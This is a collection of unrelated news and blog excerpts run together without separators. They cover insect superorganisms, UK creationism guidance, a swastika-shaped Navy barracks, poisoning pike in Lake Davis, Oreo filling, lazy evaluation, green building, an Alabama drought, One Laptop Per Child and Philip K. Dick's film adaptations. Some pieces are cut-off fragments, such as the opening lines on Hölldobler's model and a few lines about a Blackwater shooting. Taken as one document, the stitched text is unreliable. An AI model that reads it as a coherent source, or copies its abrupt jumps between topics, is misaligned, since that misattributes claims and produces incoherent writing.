The second piece of the model takes into account that “ as the colonial organization of one group rises , there is a coincident rise in discrimination against members of other societies of the same species . ”
Hölldobler notes that the competition between societies soon becomes a major force reinforcing the evolutionary process :
“ In this way the society or insect colony becomes the extended phenotype of the collective genome of the society . ”
Hölldobler believes that this model developed with Reeve goes further than others in explaining the evolutionary transition from hierarchical organizations to superorganism , “ as it also demonstrates how the target of selection shifts from the individual and kin to group selection . ”
Such a nested tug - of - war model , he says , might also be applied “ equally well to the analysis of the evolution of other animal societies ” and give insight into the evolution of cooperation in non-human and human primates , in addition to such things as collectives of cells and the formation of bacterial films .

The government has announced that it will publish guidance for schools on how creationism and intelligent design relate to science teaching , and has reiterated that it sees no place for either on the science curriculum .
It has also defined " Intelligent Design " , the idea that life is too complex to have arisen without the guiding hand of a greater intelligence , as a religion , along with " creationism " .
Responding to a petition on the Number 10 ePetitions site , the government said : " The Government is aware that a number of concerns have been raised in the media and elsewhere as to whether creationism and intelligent design have a place in science lessons .
The Government is clear that creationism and intelligent design are not part of the science National Curriculum programmes of study and should not be taught as science . "
It added that it would expect teachers to be able to answer pupil 's questions about " creationism , intelligent design , and other religious beliefs " within a scientific framework .
The petition was posted by James Rocks of the Science , Just Science campaign , a group that formed to counter a nascent anti-evolution lobby in the UK .
He wrote : " Creationism & Intelligent design are ... being used disingenuously to portray science & the theory or evolution as being in crisis when they are not ...
These ideas therefore do not constitute science , cannot be considered scientific education and therefore do not belong in the nation 's science classrooms . "
The petition was signed by 1,505 people . ®

What Do You Buy For The Totalitarian Regime That Has Everything ?
Posted by ueberbill ( 7616 views ) [ E - Mail link ]
Evidently Iran has been getting those e-mails telling you how cheap it is to buy surplus goods from the government and they did n't get caught in their spam filters .
Unfortunately the goods it 's been buying are jet parts and missile components .
U.S. Customs officials have anonymously gone on the record saying military surplus goods have been purchased by middlemen and then illegaly sold to Iran .
This is AFTER some of these middlemen have been convicted of doing that in the first place !
U.S. official 's greatest fear is that Iran will be able to get parts for their fleet of F - 14 ' Tomcat ' ( although over there they call them ' Great Satan Killers ' ) that we let them buy in the ' 70's ( " D'oh ! " ) .

CORONADO , Calif . --
The U.S. Navy has decided to spend as much as $ 600,000 for landscaping and architectural modifications to obscure the fact that one its building complexes looks like a swastika from the air .
The four L - shaped buildings , constructed in the late 1960s , are part of the amphibious base at Coronado and serve as barracks for Seabees .
From the ground and from inside nearby buildings , the controversial shape cannot be seen .
Nor are there any civilian or military landing patterns that provide such a view to airline passengers .
But once people began looking at satellite images from Google Earth , they started commenting on blogs and websites about how much the buildings resembled the symbol used by the Nazis .
Advertisement
When contacted by a Missouri - based radio talk - show host last year , Navy officials gave no indication they would make changes .
But early this year , the issue was quietly taken up by Morris Casuto , the Anti-Defamation League ’s regional director in San Diego , and U.S. Rep. Susan Davis ( D - San Diego ) .
As a result , in the fiscal year that begins Oct. 1 , the Navy has budgeted up to $ 600,000 for changes in walkways , “ camouflage ” landscaping and rooftop photovoltaic cells .
The goal is to mask the shape .
“ We do n’t want to be associated with something as symbolic and hateful as a swastika , ” said Scott Sutherland , deputy public affairs officer for Navy Region Southwest , the command that is responsible for maintaining buildings on local bases .
Advertisement
The collection of L - shaped buildings is at the corner of Tulagi and Bougainville roads , named after World War II battles .
Navy officials say the shape of the buildings , designed by local architect John Mock , was not noted until after the groundbreaking in 1967 -- and since it was not visible from the ground , a decision was made not to make any changes .
It is unclear who first noticed the shape on Google Earth .
But one of the first and loudest advocates demanding a change was Dave vonKleist , host of a Missouri - based radio - talk show , The Power Hour , and a website , www.thepowerhour.com.
In spring 2006 , he began writing military officials , including then - Defense Secretary Donald H. Rumsfeld , calling for action .
Advertisement
That August , he received a response from officials in Coronado , who made no promise to take action and said , “ The Navy intends to continue the use of the buildings as long as they remain adequate for the needs of the service . ”
In December , the now - defunct San Diego Jewish Times wrote about the buildings and the controversy .
Soon Casuto and Davis got involved .
Casuto began an on - and - off dialogue with the chief of staff to Rear Adm .
Len Hering , commander of Region Southwest .
He said that several members of the Jewish community had complained to him .
“ I do n’t ascribe any intentionally evil motives to this , ” Casuto said , referring to the design .
“ It just happened .
The Navy has been very good about recognizing the problem .
The issue is over . ”
Advertisement
Davis , who is Jewish , is also pleased with the Navy ’s decision .
During a discussion with military officials on other issues , Davis had mentioned the Coronado buildings and suggested that rooftop photovoltaic arrays might help change the overhead look .
The base gets 3 % of its power from solar energy and has been looking to increase that percentage .
Reached in Versailles , Mo. , VonKleist , the talk - show host , said he was ecstatic .
“ I ’m concerned about symbolism , ” he said .
“ This is not the type of message America needs to be sending to the world . ”

As we turned back they opened fire on all cars from behind .

No one fired at Blackwater .
They were not attacked by gunman .
They were not targeted .
Even with Maliki calling it a crime and wanting another security militia to replace them , the US will never listen to him .

A potentially fatal mistake … scary headline , is n’t it ?
It ’s the truth though , and I speak of this from personal experience .
There is a mistake being perpetuated throughout the country , but particularly ( from what I observe ) in the education system that may be preventing us from saving lives .
What is this mistake ?
It ’s assuming and believing that it is low self - esteem that leads to depression , and that raising self - esteem can get rid of depression .
Low self - esteem does n’t cause depression … low self - worth does .
And no , they are NOT the same thing .
Meriam - Webster defines self - esteem as “ a confidence and satisfaction in oneself ” .
You can have self - confidence without self - worth … you can believe that you are good at something , without believing that it makes you worth anything .
I speak from personal experience .
I have never had a problem with self - confidence .
I have , and I may sound conceited here , always known that I was smart and at least average in the looks department .
Any mental endeavour tends to come easily for me ( except remembering people ’s names … one of these days I ’m going to get around to fixing that ) .
So my self - confidence was fine .
The problem is that I did n’t think I was worth anything .
It did n’t matter if I was smart , even if I were a genius , the smartest person in the world , and it would n’t have mattered if I was the most handsome man to walk the earth .
I did n’t think that meant anything for me … it contributed nothing to my self - worth .
If you do n’t believe that you are worth anything , then you do n’t believe that you contribute anything to others , either .
You end up with little or no incentive to do anything , or even to live .
You can have untold amounts of confidence in your abilities , but without a belief that you are worth something , it does n’t mean anything .
Low self - confidence is a good indicator of low self - worth .
It ’s difficult to have anything other than low self - worth if you have no confidence in yourself .
That does n’t mean that the opposite is true , however … you ca n’t assume that someone with high self - confidence has good self - worth , also .
That also means that raising someone ’s self - esteem , as they put so much emphasis on today , does n’t necessarily ( and really , it ’s not even all that LIKELY ) raise the real key , their self - worth .
Since the true cause of depression here is low self - worth , not low self - esteem , the emphasis on self - esteem in the education system is misplaced .
What makes it even more misplaced , however , is that you ca n’t give someone self - esteem … they have to earn it .
And that ’s why some people think that it ’s self - esteem that ’s the issue … what you do that you feel earns you self - esteem can , at the same time , help you to feel you have worth .
If you feel like you are doing something worthy of greater of self - esteem , you may feel that a little bit of that “ worthy ” rubs off on you .
Mistaking the cause of depression , and the cure , can lead to attempting the wrong treatment .
If you use the wrong treatment , you are unlikely to cure the problem … and with depression , that can be fatal .
By the way , I ’m making a request with this article , as an experiment … if you like it please vote for it on Reddit ( you can click here ) , in addition to whatever thing you normally use .
PORTOLA , Calif . --
Four miles north of this High Sierra town , the front - porch gang at the Grizzly Store recently threw a shindig to ring out another fishing season at Lake Davis and curse the dreaded predator that has haunted these parts the past decade .
Folks came out of the hills , more than 200 strong , to enjoy bubbling beans , barbecued tri-tip and beer .
Then , as the late - afternoon light crept up the conifers and dusk descended , they gathered on a gravel parking lot and ceremoniously torched a lath - sided wooden effigy of the saw - toothed fish that killed their beloved lake .
Death to the pike !
“ We built it .
We burned it , ” declared Sara Bensinger , the Grizzly ’s hale and hearty proprietor .
“ It was kind of like feeding the fish gods .
Pleeeeease get rid of the pike . ”
Advertisement
State wildlife authorities are trying to do just that .
On Tuesday , for the second time in a decade , state Fish and Game Department crews will pour poison into the scenic Sierra reservoir in a bid to finish off the northern pike .
The invader from the Midwest has established itself at the top of Lake Davis ’ food chain , devastating the trophy - size trout while proving immune to extermination .
Pike have turned the reservoir into what locals call a dead lake , undermining Portola ’s economy in the process .
They pose an even bigger threat to fisheries throughout Central California .
If they ever escaped , the finned marauders could severely dent the state ’s fragile salmon and steelhead populations and even venture down into the Sacramento - San Joaquin River Delta , imperiling water exports to Southern California .
Advertisement
In an attempt to prevent such a disaster , state wildlife officials plan to pour more than 16,000 gallons of the fish poison Rotenone into Lake Davis and the web of creeks , springs and seeps that feed its watershed .
The last time Fish and Game tried this extreme tactic was in 1997 .
It was an unfettered failure -- and a public relations disaster .
Locals outraged by what they viewed as an environmentally incautious and bureaucratically imperious effort by the state won $ 9.2 million in damages .
And the pike reappeared 18 months after the poisoning .
This time , Fish and Game officials have mounted a campaign heavy on ecological sensitivity , diplomacy and public education .
Ed Pert , who heads the agency ’s pike - eradication push , said this effort is “ a moon shot , ” far more sophisticated in style and substance than the previous one .
Bill Powers , Portola ’s mayor in 1997 , remembers it like a bad dream .
Advertisement
Pike first appeared in nearby Frenchman Reservoir in 1988 , probably dumped by an unthinking backwoods angler intent on introducing a hard - fighting game fish to the Golden State .
Wildlife stewards managed to eradicate the fish from Frenchman by 1992 , but then it showed up a dozen miles west in Lake Davis .
On an overcast day 10 years ago , state officials first set out to poison the lake .
More than 100 California Highway Patrol officers descended on Portola , police helicopters buzzed overhead and law enforcement sharpshooters took up posts to protect a community water tank from sabotage .
Locals were outraged by the treatment .
“ Our attitude was , hell , you ca n’t put stuff in our water and refuse to tell us what ’s in it , ” Powers recalled .
“ That ’s what set a shock wave off in this community . ”
Advertisement
Powers pulled on a wetsuit , swam into Lake Davis and chained himself to a buoy .
Wardens hauled him from the water and into a prison bus .
His civil disobedience established his folk hero bona fides , and voters elected him a Plumas County supervisor .
Since the day in 1999 when the pike mysteriously reappeared , he has watched as the Fish and Game Department has struggled futilely to eliminate the fish with a variety of tactics .
As is it were a remake of “ Jaws , ” the department sent out commercial fishing boats to capture the pike .
The fish easily evaded the purse seine nets .
In 2005 , authorities held a pyrotechnic media event , firing exploding detonation cord a few feet below the lake surface .
The bombing run yielded good news footage but few dead pike .
Advertisement
The most successful tactic over the years has been electro - fishing , in which pike are shocked by high - voltage paddles and then netted .
Workers have harvested 65,000 , but pike numbers have continued to soar .
Meanwhile , the trout population has plummeted , despite tens of thousands of hatchery fish planted over the years .
As the state has tried repeatedly to eradicate the pike , locals have softened their stance toward Fish and Game officials .
They have come to accept that another massive dose of poison might be the last hope .
“ The hostility is n’t there anymore , the anger is n’t there , ” said Jim Murphy , Portola ’s city manager .
“ I ’m not saying people like it , but they understand why it ’s necessary . ”
Ivan Paulsen , the senior state biologist who has staffed the department ’s Portola office the last seven years , has seen a difference .
Advertisement
“ They wave at me with all five fingers now , ” Paulsen said , only half in jest .
Paulsen put off retirement for months to see the pike eradication project through .
His last day on the job is Friday , and folks hope he goes out a winner , with Lake Davis free of the fish .
To accomplish that mission , Fish and Game is tapping a big slice of its workforce and its best equipment .
Nearly two dozen boats will take to the water , including an Everglades - style airboat that can tote drums of Rotenone into the weedy shallows where pike like to lurk .
Advertisement
A crew of 250 will be in action this week .
They ’ve already ventured far up the watershed , treating even the smallest nooks that could provide refuge to the toothy invader .
Using aerial photos and GPS technology , the agency has mapped every imaginable “ wet spot ” in the region -- tributaries , spring - fed pools , even a few cattle troughs .
Last week , workers discovered healthy pike that had wiggled their way last winter into what are now foot - deep puddles a quarter - mile from the nearest brook .
Even the poison is better , officials say .
The new and improved Rotenone does n’t contain the petrochemical dispersants that hung around for five months in 1997 , raising fears about toxic risk .
This time the dispersants are a soapy formula designed to break down within days .
An independent lab analysis eased lingering concerns , and state authorities have promised to continue a rigorous testing program .
They vow that the waters of Lake Davis will exceed the most stringent federal standards .
Fish and Game authorities are also keeping an eye out for “ credible threats ” -- potential eco-saboteurs who might try to pluck a few pike from the lake , hold them in ponds out of harm ’s way and then reintroduce them after the wardens head home and the Rotenone dissipates .

Although genetic testing determined that the current generation is descended from the original Lake Davis pike , biologists still are n’t sure if the fish reappeared in 1999 because a few survived the poisoning or someone threw some back in .
Years ago , Fish and Game wardens tracked down a local mountain man they claimed had called a Reno radio station bragging that he would reintroduce pike to the lake .
Wardens raided his property and discovered several fish ponds -- but no pike .
Since then , penalties have been toughened : Violators face a $ 50,000 fine and up to a year in jail .
To keep people away during Tuesday ’s poisoning , authorities have temporarily sealed off the woods surrounding Lake Davis .
Roads into the lake will also be closed for the duration of the treatment .
Pert said authorities are “ keeping an ear to the ground ” and heeding “ any credible threat . ”

At the Grizzly Store , Sara Bensinger sees good coming after a whole lot of bad .
She bought the Grizzly in 1999 -- and the pike reappeared 10 days after she closed escrow .
After a couple of decent fishing years , the trout began to disappear .
It has been downhill ever since .
Bensinger put the Grizzly up for sale , “ but who ’s going to buy at a lake that has issues ? ” she said .
“ Reality is , c’mon , the pike took over . ”
The walls of her store are still covered with glistening lures and other fishing tackle left over from a long season .
Snacks in plastic packages vie for shelf space with firewood .
An 1820 potbelly stove sits amid it all .
Advertisement
Bensinger is set to shut down for the winter in a few weeks .
The store will be buried under snow , the lake frozen .
She said she ’ll reopen come spring ’s “ ice - out ” -- and she hopes no pike will be around to greet her .

Oreos are sandwich cookies , squeezing a delicious white sugar paste in between two thin biscuits of black chalk .
Personally , I prefer the white paste portion of the cookie .
In the United States , people eat Oreos by cracking open the two halves and scraping the white filling off with their bottom teeth .
Often we are left with with a garbage can full of black cookie disks .
It seems like a shame to toss all these cookie shells .
I wonder why the Nabisco company does n't just sell a tube of white goo ?
Conceptual rendering of Oreo Goo .
How much of the cookie is delicious white cream , and how much is black chalk ?
On Thursday night , we decided to find out .
A 20 oz , ( 567 g ) package retails for about US $ 5 .
Each package contains 51 cookies , so they are worth about a dime each .
Stacy , Mark and I carefully opened them up to extract the precious insides .
We followed the advice in Martha Stewart Silver Compendium of Culinary Technique , twisting open the halves and removing the white mass with an exquisite set of Laurel Burch spreading - knifes .
Many foods must undergo a similar separation process before they are edible :
Fish must be deboned , pistachios must be shelled , peaches must be shaven and strawberries must have the seeds removed .
Most modern families buy a fancy machine to twist them apart , but I enjoy nothing better than sitting around the fireplace with old friends , twisting Oreos and singing old radio jingles .
We kept track of the white filling in a measuring cup .
Mark does n't mind the taste of the black cookies , but he prefers them with a bit more filling inside .
We scraped all of the cookies clean and stacked them up .
There were 17 inches of black cookies and almost a cup of cream filling .
Our 30 minutes of work paid off .
We had successfully reduced the package of cookies to the essential element , 6 ounces ( 177 grams ) of confectionary perfection .
To my surprise , neither Mark nor Stacy wanted to eat any .
They said it was " too rich " , " too decadent " , and " a gross ball of sugar - lard " .

Update 2 : This article has has a new home on programblings.com .
Go to the article .
Comments are closed here but still open there :-)
( Update : be sure to read the comments , as the language used in my article was not entirely exact , in functional programming legalese ;-)
Many readers helped to clarify things a bit . )
I had a mini-epiphany recently .
Altough I have n’t had the chance yet to program with a functional programming language , it ’s a subject I ’ve had my eye on for a while .
My ear perks up when I hear about Erlang , Haskell , F# or Scala , 4 functional programming languages .
Recently I ’ve been dipping in the intricacies of memory management , at work , in .
Net .
This was in the context of the Dispose pattern ( I have a post in the making about the subject ) .
Both subjects are not directly related , but I found a parallel that might help to explain lazy evaluation to programmers used to more traditional programming languages .
I wo n’t go in depth in the subject or define the concepts precisely here .
I might however revisit what follows when I ’ve had time to actually get more experience with an FP language .
So here was my revelation :
When specifying a computation in a programming language , lazy evaluation is to the detailed , manual sequencing of operations what garbage collection and automatic memory management is to the detailed , manual management of memory .
In other words , with advanced virtual machines such as Java ’s or .
Net ’s , by allowing the VM to manage the memory , we more or less get the advantage of having world - class computer scientists optimize the management of the memory we use .
The programmer declares what he needs in term of memory , instead of specifying precisely how he needs it ( stack vs heap , who ’s responsible of freeing the memory , etc . )
The amount of control over the precise performance is lessened to a certain extent , but the resulting performance gains can often be quite stunning .
For example , I read recently that Java ’s allocation of memory on the heap requires around 10 processor operations instead of 60 to 100 , for the best C++ compilers .
See Brian Goetz ’ excellent article on IBM ’s website .
In the same manner , with a functional programming language ’s lazy evaluation , optimizations can be made without the programmer needing to state them explicitly .
The interpreter can decide when to execute the code , namely if and when its outcome is needed , and not before that .
Since the precise order of execution is not guaranteed , the bits of computing specified by the programmer in an FP can be optimized in other ways , too .
For example , if the VM sees that a given instructions in the code is not dependent on the outcome of the previous instruction , it can execute them both simultaneously , if there are more than one cores available .
It ’s managed automagically by the interpreter , no threading headache necessary .
Conversely , the programmer can specify the ordering of instructions only when necessary ( e.g. when interacting with an outside system ) .
This is why FPs are often mentioned in the current debate surrounding the looming concurrency challenge .
This kind of optimization is also being done by Java and .
Net ’s VMs , but to a much lesser extent , because of deep differences between imperative ( Java , C++ , C# ) and functional programming languages .

DAVID HOVEY junior runs his hands over the steel beams of his home , and smiles .
Tucked on a hillside in Scottsdale , Arizona that overlooks Phoenix , the property is stunning .
It is made entirely of glass and recycled steel .
The floor is elevated , leaving intact a 150 - year - old ironwood tree .
Overhangs keep out the sun .
The building is environmentally friendly , but also marketable .
Mr Hovey , who runs an architectural company called Optima , thinks many people will want a house just like this .
America is now enamoured of all things green .
A study by the National Association of Home Builders ( NAHB ) found that some 90 % of home - builders are now using green ideas .
In 2005 the study found a 20 % increase in the number of new homes that were environmentally responsible : water - efficient , energy - efficient , built of nature - friendly materials .
Last year , the figures were up another 30 % .
Green building has become big business .
Banks such as Bank of America are adding more green financing packages .
Shops selling green building supplies are springing up , as are giant shows .
The world 's largest exhibition for residential builders is West Coast Green , held in San Francisco .
Last September almost 9,000 attended ; 4,000 more are anticipated this year .
In its honour San Francisco has proclaimed next week “ West Coast Green Week ” .
Christi Graham , the president of West Coast Green , says lower building costs are helping the movement .
It used to cost at least 15 % more to build using eco-friendly ideas and products , but today they add only 1 - 3 % to the cost of construction , she says .
Media attention helps , too .
Al Gore 's documentary on global warming , “ An Inconvenient Truth ” , helped get Hollywood on board .
Last summer Brad Pitt teamed up with Global Green , a non-profit group , in a contest to design environmentally friendly homes for New Orleans .
In April Robert Redford 's series on ecology and green living was aired .
Vanity Fair , Newsweek , Forbes and Fortune magazines have run green issues and Entertainment Weekly , a Hollywood monthly , featured Al Gore on its cover .
All this has helped Americans see that green building is easy , rewarding and responsible .
The lesson is being learned in Scottsdale , a place whose extraordinary growth in recent decades has often meant swimming pools and green lawns somehow engineered in the desert .
At Camelview Village , a multi-family development designed by Mr Hovey 's father , who is also an architect , a “ desert garden ” covers the roof of each house .
It is made of plants that require minimal watering , keep the roof cooler than black roof tiles and absorb lots of carbon dioxide .
With 16 months to go until the complex is finished , 586 of the 709 units have been sold already .
At Sterling Ridge , the Scottsdale property , solar panels and energy efficient glass will keep windows cool in the searing Arizona summers .
The power savings are phenomenal , Mr Hovey junior says .
Suppliers of building materials and furniture are now scrambling to give green consumers what they want .
There is heavy demand for things such as oriented strand board , which wastes less wood and uses trees such as aspen and poplar that grow fast .
Bonded Logic in Chandler , Arizona , sells insulation made from shredded denim , a good mould - resistant alternative to fibreglass .
Rastra , a company based in Scottsdale that makes concrete from recycled styrofoam , increased its sales by 385 % between 2002 and 2005 and is looking for more American factories .
Lack of uniform standards is a problem .
One company selling hydrochloric acid for etching cement floors reckoned that , because it was in gel form and could legally be washed down the drain , the product was environmentally friendly .
And paint manufacturers are creating their own green labels instead of complying with regulations .
The US Green Building Council , for its part , is helping by expanding its energy - efficiency rating system from commercial properties to homes .
This is the first voluntary national green - building standard ; already , 7,500 homes and 330 builders are taking part in the pilot scheme .
Home - and building - owners receive credits for green materials used , which can then earn them lower mortgage rates from banks and tax incentives from state and local governments .
The NAHB has also launched and trademarked its own national green - building standard .
Fans like Mr Hovey junior need no encouragement .
As the sun dips over the Phoenix hills he surveys his masterpiece once more .
“ Green building ” , he says , “ is just the way to build . ”

Much of the region , government scientists say , is suffering from a rare sharp dry spell , though they are reluctant to attribute it to climate change .
“ In terms of its intensity , this one is very severe , ” said Donald Wilhite , director of the National Drought Mitigation Center at the University of Nebraska , Lincoln .
Most of northern Alabama , along with parts of Mississippi and Georgia , is rated D4 , the center ’s highest possible level of drought intensity , signifying an exceptional drought .
Scientists call it a cruel freak of nature , one that is causing misery to farmers at a critical period in the growing cycle and has already ruined a “ startling ” proportion of Alabama ’s agricultural output , said Douglas Le Comte , a senior meteorologist at the National Oceanic and Atmospheric Administration .
Some 88 percent of the state ’s corn crop is classified by the government as poor to very poor , along with 85 percent of its soybeans and 74 percent of its cotton .
“ The reality is , we ’re going to lose a significant amount of money this year , ” said Stuart Sanderson , a fourth - generation farmer in Limestone County , east of here .
The foothills of the Appalachians make an alluring backdrop , but the reality on the ground is grim .
“ A disaster like this is one you never see coming .
We ’re looking at a 70 to 80 percent loss , ” Mr. Sanderson said , standing by a useless field of shrunken cornstalks .
The rare , stunted ear could only manage a few malformed grains .
Deep cracks in the red earth indicated dry soil inches deep .
“ I ’ve never seen this ground do that , ” he said .
Rainfall is at least 20 inches below the normal 32 inches and in some places far lower than that .
Jerry Newby , president of the Alabama Farmers Federation , said : “ It ’s gone from bad to worse .
All of the corn is pretty much lost that ’s not under irrigation . ”
One Laptop Per Child project to stimulate demand in countries hesitant to join program
The laptop project will sell the rugged little computers to U.S. residents and Canadians for $ 400 ( 284.72 EUR ) each , with the profit going toward a machine for a poor country .
One Laptop Per Child project to stimulate demand in countries hesitant to join program
The One Laptop Per Child project expects that its " Give One , Get One " promotion will result in a pool of thousands of donated laptops that will stimulate demand in countries hesitant to join the program .
It will be offered for only two weeks in November .
Originally conceived as the " $ 100 ( 71.18 EUR ) laptop , " the funky green - and - white low - power " XO " computers now cost $ 188 ( 133.82 EUR ) .
The laptops ' manufacturer , Quanta Computer Inc. , is beginning mass production next month , but with far fewer than the 3 million orders One Laptop Per Child director Nicholas Negroponte had said he was waiting for .
Negroponte said the availability of donated laptops would not be the sole condition for many countries weighing whether to place multimillion - dollar orders .
But " it just triggers it , " he said .
" It makes it all happen faster . "
By opening sales to people in the U.S. and Canada at http://www.xogiving.com, " Give One , Get One " will delight computing aficionados , because the XO is unlike any other laptop .
It has a homegrown user interface designed for children , boasts built - in wireless networking , uses very little power and can be recharged by hand with a pulley or a crank .
Its display has separate indoor and outdoor settings so it can be read in full sunlight , something even expensive laptops lack .
The machines use the Linux open - source system and do not run Windows ; Negroponte expects that to be possible soon , but Microsoft Corp. insists it cannot guarantee that , given the machine 's idiosyncratic specs .
The catch is that " Give One , Get One " will run only from Nov. 12 to Nov. 26 .
Negroponte said the limited availability is partly necessary so the nonprofit does n't run afoul of tax laws , but mainly designed to create scarcity - induced excitement .
" We need that burst , " he said .
Just the first 25,000 buyers will be promised delivery of their XOs by the Christmas season .
Everyone else will be on a pace reminiscent of the old Sears Roebuck catalog , with the computer probably arriving in January .
Then again , most buyers figure to be motivated more by the " Give One " aspect than the " Get One " part .
Negroponte said that dynamic is beginning to pervade the program , with several poor countries finding that richer governments are willing to act as sponsors .
For example , Italy is buying all 50,000 XOs that Ethiopia will get in the program 's first wave .
Now Negroponte is trying to encourage similar arrangements with governments in Europe and Asia , with Pakistan and Afghanistan among the possible recipients .
Megabillionaire Carlos Slim is expected to purchase 25,000 XOs and lend them to Mexican children .
Thailand , Uruguay , Nigeria , Brazil , Libya and Rwanda are among the countries that could be in the first wave of laptop customers , though specifics have not been announced .
Given all the innovations in the XO and the discussions it has inspired about computers in education , One Laptop Per Child - a spinoff from the Massachusetts Institute of Technology - can claim significant achievements .
However , Negroponte hoped to be further along by now .
In September 2005 , he was saying that 5 million to 15 million machines might be in production in 2006 , with perhaps 100 million out by now .
In April 2006 he foresaw 5 million to 10 million XOs dotting the landscape in 2007 .
Now 250,000 to 300,000 are due to be made by the end of this year .
Negroponte expects that to ramp up to 1 million a month next year , though he still lacks signed orders for that many .
One reason things may have gone slower than predicted is One Laptop Per Child 's impending emergence awoke commercial vendors to the promise of a low - cost international educational market .
Now governments considering buying XOs for their youngsters have multiple options in the $ 200 ( 142.36 EUR ) range - including more - conventional computers that can run Windows .
Negroponte acknowledges the absence of Windows led Russia to say no .
One of the laptop program 's unabashed admirers is Miguel Brechner , who runs a government - funded technology group in Uruguay .
Brechner has been overseeing a test of 200 XOs in a Uruguayan village and believes the laptops have stimulated collaboration and raised expectations for children .
He expects to buy many more XOs as Uruguay soon begins to outfit all 400,000 of its primary schoolchildren with laptops .
" I 'm absolutely a believer that this will change the country , " Brechner said .
But not all of those computers will be XOs .
To hedge its bets , Uruguay probably will buy other inexpensive laptops as well , including Intel Corp .'s Classmate PCs .
Brechner argues that Windows is a better option for older kids who are closer to entering the computing work force .
" We will see ( what happens ) in the field and change whatever is necessary , " Brechner said .
" We will make some mistakes .
We do n't know who to copy on this . "
Philip K. DICK , the science - fiction author who struggled for years with personal demons , never saw “ Blade Runner , ” the first Hollywood adaptation of his writing .
He died of a stroke just four months shy of its release in 1982 .
His grieving daughter Isa , then 15 , remembers going to see the film in a San Rafael theater hoping that it might , somehow , keep part of her father alive .
“ I went with my mom and I remember that there were maybe two other people in the whole theater and that was the way it was everywhere -- the movie was a total failure , ” Isa Dick Hackett said .
“ I remember too that the lights came up before the dedication at the end , so I did n’t even get to see that .
It was like a double slap in the face . ”
After the bruising “ Blade Runner ” fiasco , Dick ’s family assumed that the late writer had “ zero future in movies , ” as his daughter put it .
That would have added another discouraging footnote to a pained life .
Dick had five failed marriages , wrote most of his novels while gobbling amphetamines and , in the grips or paranoia or religious visions , he felt always the outsider .
But while Philip Kindred Dick was a disaffected loner in life , in death his ideas turned out to be pitch - perfect for a Digital Age that wanted science fiction not just about aliens but also about the alienated .

Posthumously , Dick became a one - man factory for Hollywood projects , with his fiction reaching the screen nine times .
Among the films : Steven Spielberg ’s “ Minority Report , ” Paul Verhoeven ’s “ Total Recall , ” John Woo ’s “ Paycheck ” and , earlier this year , the Nicolas Cage vehicle “ Next , ” which arrives on DVD in stores on Sept. 25 .
“ Blade Runner , ” meanwhile , has bounced back from its early obscurity to become one of the most celebrated science - fiction films ever made .
In October , it returns to theaters with “ Blade Runner : The Final Cut , ” a 25th anniversary edition that , for the first time , realizes director Ridley Scott ’s vision with a meticulous reworking .

All of it makes for a staggering turnaround for the family of the troubled writer whose work presaged the cyberpunk movement ; there is still debate about the quality of his actual prose versus the urgency of his concepts , but now , finally , he is at least mentioned as often as the familiar icons of the genre during his lifetime , the Asimovs , Bradburys , Clarkes and Heinleins .
( Four of Dick ’s 1960s novels have just been reissued by the prestigious Library of America , giving the paperback writer some new hardcover cachet . )
This month , Hackett , who is 40 and lives in the Bay Area , joined Scott and much of the cast of “ Blade Runner ” at a gala premiere of the reconstituted version at the Venice Film Festival .
The clamor of the international press and the ornate trappings of the theater on the Lido made for a surreal counterpoint to the sad California experience in the summer of 1982 .
“ I kept thinking back to how it was when I saw it that first time and how I had walked in with this little glimmer of hope that the movie would bring more attention to my dad and his writing .
I loved the film myself , but I gave up that hope .
And now it ’s all pretty amazing . ”
Hackett and her sister Laura Leslie are the principal players behind Electric Shepherd , the family ’s production company .
The company , which is now opening an L.A. office , was created in 2005 partly out of frustration ; after watching Hollywood disappointments such as “ Screamers ” and “ Paycheck , ” the Dick brood decided they needed a stronger hand in future projects .

Right now , Hackett said , there are six film projects that are in various stages of negotiation or development , including advanced talks that would finally bring one of his signature works , “ Ubik , ” to life as a feature film .
Hollywood creators have flirted with “ Ubik , ” the 1969 novel , more than any other single work in the Dick library .
Its tale of skirmishing telepaths and slippery reality earned it a spot on Time magazine ’s 2005 list of the 100 greatest English - language novels since 1923 .
There are also strong pushes being made into video games and graphic novels , and a audio - book collection of his complete short stories is expected to launch in 2008 .
There ’s also a limited series for television written by David Hayter ( a screenwriter on “ X - Men ” and the upcoming “ Watchmen ” ) that pulls together a dozen or so of Dick ’s short stories within a narrative frame .
Of all the percolating ventures , however , none is a higher priority than a biopic of Dick that is being penned now by screenwriter Tony Grisoni ( “ Fear and Loathing in Las Vegas ” ) ; Oscar - nominated actor Paul Giamatti is the star and co-producer .
Hackett said this week that the script will intertwine Dick ’s life story with scenes from his final and unfinished novel , “ The Owl in Daylight , ” a typical Dick story in that it bundles up themes of the fantastic and the disaffected .

The basic premise :
An alien culture that cannot hear sound comes to Earth and inserts a bio-chip into the brain of a composer to funnel the experience of music to their society for the first time -- but the fellow they pick is a hack writer of B movie scores , and the aliens hunger for a richer experience than his talent can deliver .
Then the bio-chip begins to push and inspire him to new heights of creativity , but it also begins to scorch his mind .
“ He ’s making this fantastic music , but the rub is he ’s burning his brain out , ” Hackett said .
“ In many ways it really is my father ’s story .
He could n’t not write -- he had these experiences he had to write about -- but it was all at a tremendous cost to him .
So the fictional story and his own dovetail beautifully . ”
That would hint at a movie that chronicles a writer ’s life by blurring the lines between his real world and the one he created on the page , Ã la “ Naked Lunch ” or “ American Splendor ” ( which also starred Giamatti ) .
The “ Naked Lunch ” comparison seems especially relevant ; like William S. Burroughs , Dick also lived an unhinged life .
Paranoia , drug binges and fractured relationships are at the heart of the story , and Hackett admits having deep reservations about seeing it play out on a screen .
“ But I think this movie is going to be made , it ’s inevitable , so I think the family should be part of it .
I think it ’s better to be in the room definitely , ” Hackett said .
“ I think I ’ve come to the point where I think it ’s a positive if we can play a role and have some influence and keep it sensitive and make sure it has a heart and not just focused on the sensational . ”

Her half - sister , Leslie , echoed that : “ In a way , we feel we have to do it , because someone is going to make a film to fill that void . ”
Dick was married five times before his death at age 53 in Orange County .
He had three children , each by a different wife .
Isa , which is short for Isolde , was the second of the children , and her mother , Nancy Hackett , divorced the author in 1972 after six difficult years .
The girl kept in touch with her father through letters and occasional visits , and she said she intuitively understood how to navigate around his anxieties , such as his intense discomfort in crowds and extended social interactions .
Now Hackett is the most visible face for the family as the children carry on with their father ’s considerable library .
“ The three of us , ” she said proudly , “ have not had a single significant disagreement on a project , ever . ”
She counts one of their great successes to be “ A Scanner Darkly , ” the 2006 Richard Linklater adaptation that starred Keanu Reeves , Robert Downey Jr. and Winona Ryder working for scale .
The film used an animation process that made it possible to capture the fantastic elements of the story on a small budget .
